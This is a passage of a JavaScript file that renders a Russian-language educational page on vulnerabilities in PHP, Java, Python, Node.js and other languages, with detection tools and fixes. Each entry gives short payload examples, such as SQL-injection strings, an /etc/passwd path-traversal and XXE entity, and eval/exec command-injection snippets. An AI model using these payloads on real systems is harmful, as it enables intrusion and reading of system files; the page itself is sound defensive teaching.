                <td>Использовать безопасные функции обработки данных, проводить аудит кода, обновлять ПО.</td>
              </tr>
              <tr>
                <td><strong>Denial of Service (<code>BDU:2020-05131</code>)</strong></td>
                <td>Уязвимость, связанная с <code>CWE-119</code>, вызывающая отказ в обслуживании через специально сформированный RPC-запрос.</td>
                <td>Злоумышленник отправляет запрос, приводящий к сбою веб-приложения из-за некорректной обработки данных.</td>
                <td>Ограничить размер входных данных, настроить лимиты запросов, использовать WAF для фильтрации.</td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
    `;

    document.querySelector('.back-btn').addEventListener('click', () => {
      loadVulnerabilitiesContent(container);
    });
}

function loadLanguageVulnerabilitiesContent(container) {
  container.innerHTML = `
    <div class="vulnerabilities-container">
      <button class="back-btn">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <line x1="19" y1="12" x2="5" y2="12"></line>
          <polyline points="12 19 5 12 12 5"></polyline>
        </svg>
        Назад
      </button>
      <h1>Уязвимости языков программирования</h1>
      <div class="language-vuln-description">
        <p>Уязвимости в языках программирования возникают из-за ошибок в коде, неправильного использования встроенных функций или недостатков в архитектуре приложений. Здесь рассматриваются популярные языки программирования, методы поиска уязвимостей, их эксплуатация (в научных целях, не нарушая законодательство) и возможные векторы атак. Все примеры предназначены для образовательных целей и тестирования в контролируемых средах с явным разрешением владельцев систем.</p>

        <h2>Языки программирования и их уязвимости</h2>
      </div>

      <div class="language-method">
        <div class="language-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
          <div class="language-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
            <h3>PHP</h3>
            <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
              <div style="background-color: #1976d2; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Типичные уязвимости
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">SQLi, XSS, RCE</p>
              </div>
              <div style="background-color: #2196f3; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Поиск
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Статический анализ</p>
              </div>
              <div style="background-color: #64b5f6; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Эксплуатация
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Внедрение кода</p>
              </div>
            </div>
          </div>
          <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
          <div style="flex: 1; padding: 15px;">
            <h3>PHP</h3>
            <p><strong>Типичные уязвимости:</strong> SQL-инъекции (SQLi), межсайтовый скриптинг (XSS), удалённое выполнение кода (RCE), уязвимости включения файлов (LFI/RFI).</p>
            <p><strong>Как искать:</strong> Используйте статический анализ (RIPS, Psalm), ищите опасные функции вроде <code>eval()</code>, <code>exec()</code>, <code>include()</code> без фильтрации ввода. Проверяйте запросы к БД без параметризации (например, <code>mysql_query($_GET['id'])</code>).</p>
            <p><strong>Эксплуатация (в научных целях):</strong> Для SQLi — подставьте <code>' OR '1'='1</code> в параметры ввода; для RCE — используйте <code>system($_GET['cmd'])</code> в тестовой среде с разрешения владельца; для LFI — попробуйте <code>../../etc/passwd</code>. Все действия только в контролируемой среде.</p>
            <p><strong>Векторы эксплуатации:</strong> GET/POST-параметры, заголовки HTTP, загрузка файлов, десериализация данных (<code>unserialize()</code>).</p>
            <p><strong>Рекомендации:</strong> Используйте PDO с параметризованными запросами, экранируйте вывод (<code>htmlspecialchars()</code>), избегайте динамического выполнения кода.</p>
          </div>
        </div>
      </div>

      <div class="language-method">
        <div class="language-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
          <div class="language-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
            <h3>Java</h3>
            <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
              <div style="background-color: #1976d2; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Типичные уязвимости
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">XXE, RCE, Deserialization</p>
              </div>
              <div style="background-color: #2196f3; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Поиск
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">SpotBugs</p>
              </div>
              <div style="background-color: #64b5f6; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Эксплуатация
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Payload в XML</p>
              </div>
            </div>
          </div>
          <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
          <div style="flex: 1; padding: 15px;">
            <h3>Java</h3>
            <p><strong>Типичные уязвимости:</strong> XML External Entity (XXE), небезопасная десериализация, SQLi, RCE.</p>
            <p><strong>Как искать:</strong> Используйте SpotBugs, FindBugs, анализаторы кода (SonarQube). Проверяйте использование <code>ObjectInputStream</code>, <code>XMLDecoder</code>, уязвимые парсеры XML (SAX, DOM).</p>
            <p><strong>Эксплуатация (в научных целях):</strong> Для XXE — отправьте XML с <code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code>; для десериализации — создайте вредоносный объект (ysoserial) в тестовой среде с разрешения.</p>
            <p><strong>Векторы эксплуатации:</strong> Ввод XML, сериализованные объекты, параметры запросов, загрузка файлов.</p>
            <p><strong>Рекомендации:</strong> Отключите внешние сущности в XML-парсерах, используйте белые списки для десериализации, применяйте ORM (Hibernate) для SQL.</p>
          </div>
        </div>
      </div>

      <div class="language-method">
        <div class="language-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
          <div class="language-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
            <h3>Kotlin</h3>
            <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
              <div style="background-color: #1976d2; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Типичные уязвимости
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">SQLi, RCE</p>
              </div>
              <div style="background-color: #2196f3; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Поиск
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Detekt</p>
              </div>
              <div style="background-color: #64b5f6; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Эксплуатация
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Внедрение</p>
              </div>
            </div>
          </div>
          <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
          <div style="flex: 1; padding: 15px;">
            <h3>Kotlin</h3>
            <p><strong>Типичные уязвимости:</strong> SQLi, RCE (через Java-библиотеки), небезопасная десериализация.</p>
            <p><strong>Как искать:</strong> Используйте Detekt, SonarQube для анализа кода, проверяйте интеграцию с Java (например, <code>ObjectInputStream</code>).</p>
            <p><strong>Эксплуатация (в научных целях):</strong> Аналогично Java — тестируйте десериализацию или SQLi (<code>' OR 1=1</code>) в тестовой среде с разрешения.</p>
            <p><strong>Векторы эксплуатации:</strong> Параметры ввода, взаимодействие с Java-библиотеками, JSON/XML-данные.</p>
            <p><strong>Рекомендации:</strong> Используйте безопасные API (Kotlinx.serialization), параметризованные запросы, избегайте устаревших Java-функций.</p>
          </div>
        </div>
      </div>

      <div class="language-method">
        <div class="language-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
          <div class="language-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
            <h3>C#</h3>
            <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
              <div style="background-color: #1976d2; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Типичные уязвимости
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">SQLi, XSS</p>
              </div>
              <div style="background-color: #2196f3; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Поиск
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Roslyn</p>
              </div>
              <div style="background-color: #64b5f6; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Эксплуатация
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Внедрение SQL</p>
              </div>
            </div>
          </div>
          <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
          <div style="flex: 1; padding: 15px;">
            <h3>C#</h3>
            <p><strong>Типичные уязвимости:</strong> SQLi, XSS, небезопасная десериализация, RCE через <code>Process.Start()</code>.</p>
            <p><strong>Как искать:</strong> Используйте Roslyn-анализаторы, SonarQube, ищите <code>SqlCommand</code> без параметров, <code>BinaryFormatter</code>.</p>
            <p><strong>Эксплуатация (в научных целях):</strong> Для SQLi — подставьте <code>' OR '1'='1</code>; для RCE — используйте <code>Process.Start("cmd.exe", "/c dir")</code> в тестовой среде.</p>
            <p><strong>Векторы эксплуатации:</strong> Ввод пользователя, HTTP-запросы, сериализованные данные.</p>
            <p><strong>Рекомендации:</strong> Используйте Entity Framework, экранируйте вывод, избегайте <code>BinaryFormatter</code>.</p>
          </div>
        </div>
      </div>

      <div class="language-method">
        <div class="language-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
          <div class="language-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
            <h3>Python</h3>
            <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
              <div style="background-color: #1976d2; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Типичные уязвимости
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">RCE, Pickle</p>
              </div>
              <div style="background-color: #2196f3; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Поиск
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Bandit</p>
              </div>
              <div style="background-color: #64b5f6; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Эксплуатация
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Eval</p>
              </div>
            </div>
          </div>
          <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
          <div style="flex: 1; padding: 15px;">
            <h3>Python</h3>
            <p><strong>Типичные уязвимости:</strong> RCE через <code>eval()</code>/<code>exec()</code>, небезопасная десериализация (<code>pickle</code>), SQLi.</p>
            <p><strong>Как искать:</strong> Используйте Bandit, Pylint, ищите <code>eval(input())</code>, <code>pickle.loads()</code>, прямые SQL-запросы.</p>
            <p><strong>Эксплуатация (в научных целях):</strong> Для RCE — подставьте <code>__import__('os').system('ls')</code> в <code>eval()</code>; для <code>pickle</code> — создайте вредоносный объект в тестовой среде.</p>
            <p><strong>Векторы эксплуатации:</strong> Ввод пользователя, загрузка файлов, сетевые данные.</p>
            <p><strong>Рекомендации:</strong> Избегайте <code>eval()/exec()</code>, используйте <code>json</code> вместо <code>pickle</code>, применяйте ORM (SQLAlchemy).</p>
          </div>
        </div>
      </div>

      <div class="language-method">
        <div class="language-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
          <div class="language-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
            <h3>Ruby</h3>
            <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
              <div style="background-color: #1976d2; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Типичные уязвимости
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">RCE, YAML</p>
              </div>
              <div style="background-color: #2196f3; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Поиск
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Brakeman</p>
              </div>
              <div style="background-color: #64b5f6; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Эксплуатация
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Eval</p>
              </div>
            </div>
          </div>
          <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
          <div style="flex: 1; padding: 15px;">
            <h3>Ruby</h3>
            <p><strong>Типичные уязвимости:</strong> RCE через <code>eval</code>, небезопасная десериализация YAML, SQLi.</p>
            <p><strong>Как искать:</strong> Используйте Brakeman, RuboCop, ищите <code>eval(params[:x])</code>, <code>YAML.load</code>.</p>
            <p><strong>Эксплуатация (в научных целях):</strong> Для RCE — подставьте <code>system('ls')</code> в <code>eval</code>; для YAML — отправьте вредоносный YAML (<code>!ruby/object</code>) в тестовой среде.</p>
            <p><strong>Векторы эксплуатации:</strong> Параметры запросов, пользовательский ввод, загрузка файлов.</p>
            <p><strong>Рекомендации:</strong> Используйте <code>safe_yaml</code>, избегайте <code>eval</code>, применяйте ActiveRecord для SQL.</p>
          </div>
        </div>
      </div>

      <div class="language-method">
        <div class="language-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
          <div class="language-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
            <h3>Node.js</h3>
            <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
              <div style="background-color: #1976d2; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Типичные уязвимости
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">SSRF, RCE</p>
              </div>
              <div style="background-color: #2196f3; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Поиск
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">ESLint</p>
              </div>
              <div style="background-color: #64b5f6; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Эксплуатация
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Eval</p>
              </div>
            </div>
          </div>
          <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
          <div style="flex: 1; padding: 15px;">
            <h3>Node.js</h3>
            <p><strong>Типичные уязвимости:</strong> SSRF, RCE через <code>eval()</code>, SQLi, Prototype Pollution.</p>
            <p><strong>Как искать:</strong> Используйте ESLint, Snyk, ищите <code>eval(req.query.x)</code>, <code>child_process.exec()</code>, уязвимые npm-пакеты.</p>
            <p><strong>Эксплуатация (в научных целях):</strong> Для RCE — подставьте <code>require('child_process').exec('ls')</code>; для Prototype Pollution — измените <code>__proto__</code> в JSON.</p>
            <p><strong>Векторы эксплуатации:</strong> HTTP-запросы, JSON-данные, npm-пакеты.</p>
            <p><strong>Рекомендации:</strong> Используйте безопасные альтернативы (<code>vm</code>), проверяйте зависимости (Snyk), применяйте ORM (Sequelize).</p>
          </div>
        </div>
      </div>

      <div class="language-method">
        <div class="language-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
          <div class="language-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
            <h3>Objective-C</h3>
            <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
              <div style="background-color: #1976d2; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Типичные уязвимости
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Buffer Overflow</p>
              </div>
              <div style="background-color: #2196f3; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Поиск
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Clang</p>
              </div>
              <div style="background-color: #64b5f6; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Эксплуатация
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Переполнение</p>
              </div>
            </div>
          </div>
          <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
          <div style="flex: 1; padding: 15px;">
            <h3>Objective-C</h3>
            <p><strong>Типичные уязвимости:</strong> Переполнение буфера, небезопасное форматирование строк, инъекции.</p>
            <p><strong>Как искать:</strong> Используйте Clang Static Analyzer, ищите <code>strcpy</code>, <code>sprintf</code>, прямые SQL-запросы.</p>
            <p><strong>Эксплуатация (в научных целях):</strong> Для переполнения буфера — отправьте длинную строку в <code>strcpy</code> в тестовой среде.</p>
            <p><strong>Векторы эксплуатации:</strong> Ввод пользователя, сетевые данные, форматированные строки.</p>
            <p><strong>Рекомендации:</strong> Используйте безопасные функции (<code>strncpy</code>), применяйте ORM, проверяйте границы ввода.</p>
          </div>
        </div>
      </div>

      <div class="language-method">
        <div class="language-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
          <div class="language-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
            <h3>Swift</h3>
            <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
              <div style="background-color: #1976d2; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Типичные уязвимости
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">SQLi, RCE</p>
              </div>
              <div style="background-color: #2196f3; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Поиск
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">SwiftLint</p>
              </div>
              <div style="background-color: #64b5f6; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Эксплуатация
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Внедрение</p>
              </div>
            </div>
          </div>
          <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
          <div style="flex: 1; padding: 15px;">
            <h3>Swift</h3>
            <p><strong>Типичные уязвимости:</strong> SQLi, RCE через небезопасные вызовы Objective-C, ошибки десериализации.</p>
            <p><strong>Как искать:</strong> Используйте SwiftLint, ищите прямые SQL-запросы, вызовы Objective-C (<code>NSUnarchiver</code>).</p>
            <p><strong>Эксплуатация (в научных целях):</strong> Для SQLi — подставьте <code>' OR 1=1</code> в тестовой среде.</p>
            <p><strong>Векторы эксплуатации:</strong> Ввод пользователя, сетевые запросы, интеграция с Objective-C.</p>
            <p><strong>Рекомендации:</strong> Используйте безопасные API (Codable), ORM (GRDB), избегайте устаревших функций.</p>
          </div>
        </div>
      </div>

      <div class="language-method">
        <div class="language-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
          <div class="language-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
            <h3>Dart</h3>
            <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
              <div style="background-color: #1976d2; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Типичные уязвимости
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">SQLi, SSRF</p>
              </div>
              <div style="background-color: #2196f3; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Поиск
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Dart Analyzer</p>
              </div>
              <div style="background-color: #64b5f6; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Эксплуатация
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Внедрение</p>
              </div>
            </div>
          </div>
          <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
          <div style="flex: 1; padding: 15px;">
            <h3>Dart</h3>
            <p><strong>Типичные уязвимости:</strong> SQLi, SSRF, небезопасное использование HTTP-клиентов.</p>
            <p><strong>Как искать:</strong> Используйте Dart Analyzer, ищите прямые SQL-запросы, вызовы <code>http.get</code> без валидации.</p>
            <p><strong>Эксплуатация (в научных целях):</strong> Для SSRF — подставьте <code>http://localhost</code> в запросы в тестовой среде.</p>
            <p><strong>Векторы эксплуатации:</strong> Ввод пользователя, сетевые запросы, JSON-данные.</p>
            <p><strong>Рекомендации:</strong> Используйте ORM (ObjectBox), валидируйте URL, применяйте HTTPS.</p>
          </div>
        </div>
      </div>

      <div class="language-vuln-description">
        <h2>Общие рекомендации</h2>
        <ul>
          <li>Проводите статический и динамический анализ кода для всех языков (инструменты: SonarQube, Snyk, OWASP ZAP).</li>
          <li>Избегайте использования опасных функций, выполняющих код напрямую (<code>eval</code>, <code>exec</code>).</li>
          <li>Применяйте ORM и параметризованные запросы для защиты от SQL-инъекций.</li>
          <li>Проверяйте зависимости на наличие уязвимостей (Snyk, Dependabot).</li>
          <li>Тестируйте уязвимости только в контролируемых средах с разрешения владельцев систем, соблюдая законодательство.</li>
        </ul>
      </div>
    </div>
  `;

  document.querySelector('.back-btn').addEventListener('click', () => {
    loadVulnerabilitiesContent(container);
  });
}